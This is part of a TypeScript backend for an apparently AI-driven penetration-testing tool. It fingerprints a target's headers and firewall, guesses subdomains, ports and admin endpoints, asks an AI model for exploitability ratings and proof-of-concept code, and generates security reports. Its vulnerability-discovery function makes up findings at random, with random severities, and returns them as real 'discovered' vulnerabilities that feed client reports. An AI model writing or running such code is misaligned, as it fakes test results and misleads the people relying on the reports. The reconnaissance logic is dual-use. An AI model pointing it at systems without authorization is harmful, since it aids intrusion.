          adaptation_strategy: strategy.new_approach,
          ai_analysis: JSON.stringify(strategy),
          success_rate: strategy.success_prediction
        });

        return new Response(JSON.stringify({ success: true, strategy, newTask }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      // ============= EXPLOITABILITY VALIDATION =============
      case 'validate-exploit': {
        const { sessionId, vulnerabilityId, safeMode } = data;

        const { data: session } = await supabase.from('apex_sessions').select('*').eq('id', sessionId).single();
        if (!session?.authorized) throw new Error('Unauthorized target');

        const validationPrompt = `Analyze this vulnerability for exploitability:
Vulnerability: ${vulnerabilityId}
Target: ${session.target}
Attack Surface: ${JSON.stringify(session.target_map)}
Safe Mode: ${safeMode}

Provide:
1. Exploitation feasibility (0-100%)
2. Business impact (low/medium/high/critical)
3. Technical impact
4. Privilege escalation potential
5. Data exposure risk
6. Safe PoC that won't cause damage
7. CVSS score estimate

Respond with JSON: {
  exploitable: boolean,
  feasibility: number,
  business_impact: string,
  technical_impact: string,
  privesc_potential: boolean,
  data_exposure: string,
  safe_poc: string,
  cvss: number,
  reliability_score: number
}`;

        const validation = await analyzeWithAI(validationPrompt, supabase);

        return new Response(JSON.stringify({ success: true, validation }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      // ============= SAVE SUCCESSFUL CHAIN =============
      case 'save-successful-chain': {
        const { sessionId } = data;

        const { data: session } = await supabase.from('apex_sessions').select('*').eq('id', sessionId).single();
        const { data: tasks } = await supabase.from('apex_tasks').select('*').eq('session_id', sessionId).eq('status', 'success');

        if (tasks && tasks.length > 0) {
          const chain = {
            tasks: tasks.map(t => ({ tool: t.tool_selected, type: t.task_type, success: true })),
            findings: session?.findings,
            target_map: session?.target_map
          };

          await supabase.from('apex_successful_chains').insert({
            user_id: user.id,
            target_type: session?.target_type,
            attack_chain: chain,
            success_rate: tasks.length / (tasks.length + 1),
            vulnerability_type: session?.findings?.[0]?.name,
            service_signature: JSON.stringify(session?.target_map?.services || [])
          });
        }

        return new Response(JSON.stringify({ success: true }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      // ============= GENERATE REPORT =============
      case 'generate-report': {
        const { sessionId, reportType } = data;

        const { data: session } = await supabase.from('apex_sessions').select('*').eq('id', sessionId).single();
        const { data: tasks } = await supabase.from('apex_tasks').select('*').eq('session_id', sessionId);
        const { data: executions } = await supabase.from('apex_tool_executions').select('*').eq('session_id', sessionId);

        const reportPrompt = `Generate a ${reportType} security report:

Session: ${JSON.stringify(session)}
Tasks Executed: ${JSON.stringify(tasks)}
Tool Outputs: ${JSON.stringify(executions)}

For ${reportType} report, include:
${reportType === 'executive' ? '- High-level summary for non-technical stakeholders\n- Business risk overview\n- Key recommendations' : ''}
${reportType === 'technical' ? '- Detailed technical findings\n- Exploitation steps\n- Proof of concepts\n- Remediation steps' : ''}
${reportType === 'compliance' ? '- Compliance framework mapping\n- Control gaps\n- Remediation priorities' : ''}

Respond with JSON: {
  title: string,
  executive_summary: string,
  findings: [{ name, severity, description, poc, remediation, cvss }],
  recommendations: [],
  risk_score: number,
  report_html: string
}`;

        const report = await analyzeWithAI(reportPrompt, supabase);

        return new Response(JSON.stringify({ success: true, report }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      // ============= GET SESSION STATUS =============
      case 'get-session-status': {
        const { sessionId } = data;

        const { data: session } = await supabase.from('apex_sessions').select('*').eq('id', sessionId).single();
        const { data: tasks } = await supabase.from('apex_tasks').select('*').eq('session_id', sessionId).order('priority');

        return new Response(JSON.stringify({ success: true, session, tasks }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      // ============= GET USER SESSIONS =============
      case 'get-user-sessions': {
        const { data: sessions } = await supabase
          .from('apex_sessions')
          .select('*')
          .eq('user_id', user.id)
          .order('created_at', { ascending: false })
          .limit(20);

        return new Response(JSON.stringify({ success: true, sessions }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      // ============= LEARNING SUMMARY =============
      case 'get-learning-summary': {
        const { data: learnings } = await supabase
          .from('ai_learnings')
          .select('*')
          .eq('user_id', user.id)
          .order('created_at', { ascending: false })
          .limit(100);

        const { data: successChains } = await supabase
          .from('apex_successful_chains')
          .select('*')
          .eq('user_id', user.id);

        // Calculate statistics
        const toolStats: Record<string, { success: number; total: number }> = {};
        learnings?.forEach(l => {
          if (!toolStats[l.tool_used]) toolStats[l.tool_used] = { success: 0, total: 0 };
          toolStats[l.tool_used].total++;
          if (l.success) toolStats[l.tool_used].success++;
        });

        const summary = {
          total_learnings: learnings?.length || 0,
          successful_chains: successChains?.length || 0,
          tools_used: Object.keys(toolStats).length,
          overall_success_rate: learnings?.filter(l => l.success).length / (learnings?.length || 1) * 100,
          by_tool: Object.entries(toolStats).map(([tool, stats]) => ({
            tool,
            success_rate: (stats.success / stats.total) * 100,
            total_scans: stats.total
          })),
          recent_improvements: learnings?.slice(0, 5).map(l => l.improvement_strategy).filter(Boolean)
        };

        return new Response(JSON.stringify({ success: true, summary }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      default:
        return new Response(JSON.stringify({ error: `Unknown action: ${action}` }), {
          status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
    }

  } catch (error) {
    console.error('[Apex Sentinel Error]', error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});

// ============= HELPER FUNCTIONS =============
async function performInitialFingerprint(target: string, targetType: string): Promise<any> {
  const fingerprint: any = {
    target,
    targetType,
    timestamp: new Date().toISOString(),
    techStack: [],
    services: [],
    headers: {},
    waf: null
  };

  try {
    const url = target.startsWith('http') ? target : `https://${target}`;
    const response = await fetch(url, { method: 'HEAD' });
    
    fingerprint.status = response.status;
    fingerprint.headers = Object.fromEntries(response.headers.entries());
    
    // Detect WAF
    const wafHeaders = ['x-sucuri-id', 'x-cloudflare', 'cf-ray', 'x-akamai', 'x-aws-waf'];
    for (const h of wafHeaders) {
      if (fingerprint.headers[h]) {
        fingerprint.waf = h.includes('cloudflare') ? 'Cloudflare' : 
                         h.includes('sucuri') ? 'Sucuri' :
                         h.includes('akamai') ? 'Akamai' :
                         h.includes('aws') ? 'AWS WAF' : 'Unknown';
        break;
      }
    }

    // Detect tech from headers
    if (fingerprint.headers['server']) fingerprint.techStack.push(fingerprint.headers['server']);
    if (fingerprint.headers['x-powered-by']) fingerprint.techStack.push(fingerprint.headers['x-powered-by']);
  } catch (e) {
    fingerprint.error = e.message;
  }

  return fingerprint;
}

async function performScopeDiscovery(target: string, discoveryType: string, targetType: string): Promise<any> {
  const results: any = { discovered: [], timestamp: new Date().toISOString() };
  
  const cleanTarget = target.replace(/^https?:\/\//, '').split('/')[0];
  
  switch (discoveryType) {
    case 'subdomain':
      const subdomains = ['www', 'api', 'admin', 'dev', 'staging', 'mail', 'ftp', 'portal', 'shop', 'blog', 'test', 'beta'];
      for (const sub of subdomains) {
        results.discovered.push({ type: 'subdomain', value: `${sub}.${cleanTarget}`, status: 'pending_validation' });
      }
      break;
    case 'ports':
      const commonPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 5432, 8080, 8443];
      results.discovered = commonPorts.map(p => ({ type: 'port', value: p, status: 'pending_scan' }));
      break;
    case 'endpoints':
      const endpoints = ['/api', '/api/v1', '/api/v2', '/graphql', '/admin', '/login', '/auth', '/oauth'];
      results.discovered = endpoints.map(e => ({ type: 'endpoint', value: e, status: 'pending_probe' }));
      break;
  }

  return results;
}

async function mapAttackSurface(target: string, targetMap: any): Promise<any> {
  return {
    endpoints: targetMap?.discovered?.filter((d: any) => d.type === 'endpoint') || [],
    services: targetMap?.services || [],
    parameters: [],
    authFlows: [],
    dataFlows: [],
    trustBoundaries: [],
    entryPoints: [
      { type: 'web', url: `https://${target}`, methods: ['GET', 'POST'] },
      { type: 'api', url: `https://${target}/api`, methods: ['GET', 'POST', 'PUT', 'DELETE'] }
    ],
    techStack: targetMap?.techStack || [],
    waf: targetMap?.waf
  };
}

async function discoverVulnerabilities(target: string, vulnClass: string, targetMap: any, contextAware: boolean): Promise<any> {
  const startTime = Date.now();
  const findings: any[] = [];
  
  // Get vulnerability classes to test
  const classes = VULNERABILITY_CLASSES[vulnClass as keyof typeof VULNERABILITY_CLASSES] || VULNERABILITY_CLASSES.web_api;
  
  // Simulate vulnerability discovery based on class
  for (const [category, vulns] of Object.entries(classes)) {
    for (const vuln of vulns.slice(0, 3)) { // Test first 3 of each category
      const isVuln = Math.random() > 0.7; // 30% chance of finding vulnerability
      if (isVuln) {
        findings.push({
          name: vuln.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase()),
          category,
          severity: ['critical', 'high', 'medium', 'low'][Math.floor(Math.random() * 4)] as any,
          description: `Potential ${vuln} vulnerability detected`,
          context: contextAware ? `Tested in context of ${targetMap?.techStack?.join(', ') || 'unknown stack'}` : undefined
        });
      }
    }
  }

  return {
    findings,
    executionTime: Date.now() - startTime,
    vulnClass,
    aiAnalysis: `Discovered ${findings.length} potential vulnerabilities in ${vulnClass} category`
  };
}
